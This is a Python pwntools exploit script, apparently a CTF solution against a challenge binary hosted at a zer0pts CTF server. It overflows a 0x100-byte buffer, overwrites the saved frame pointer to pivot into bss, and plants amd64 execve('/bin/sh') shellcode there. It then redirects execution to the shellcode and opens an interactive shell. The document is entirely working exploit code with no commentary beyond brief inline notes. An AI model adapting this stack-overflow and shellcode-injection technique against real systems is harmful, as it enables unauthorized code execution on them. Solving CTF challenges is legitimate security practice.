#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('chall')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('pwn.ctf.zer0pts.com', 9011)

target_ret_addr = 0x60023c

notvuln = elf.symbols['notvuln']

buffer = "A" * 0x100 # buffer
# saved rbp overwrite to bss value where return addr is stored
payload1 = buffer + p64(target_ret_addr + 0x100)

p.sendlineafter("Data: ", payload1)

payload2 = p64(notvuln) + "\x00" * (0x10 - 2)
# shellcraft amd64.linux.sh -f s
# shellcode in bss
payload2 += "jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"

p.sendlineafter("Data: ", payload2)

payload3 = buffer + p64(target_ret_addr + 0x100)

p.sendlineafter("Data: ", payload3)

shellcode_addr = target_ret_addr + 8 + 0x10 - 2

log.info("Shellcode Addr: 0x{:x}".format(shellcode_addr))

# pause()

p.sendlineafter("Data: ", p64(shellcode_addr))
# p.sendlineafter("Data: ", "A" * 8)


p.interactive()
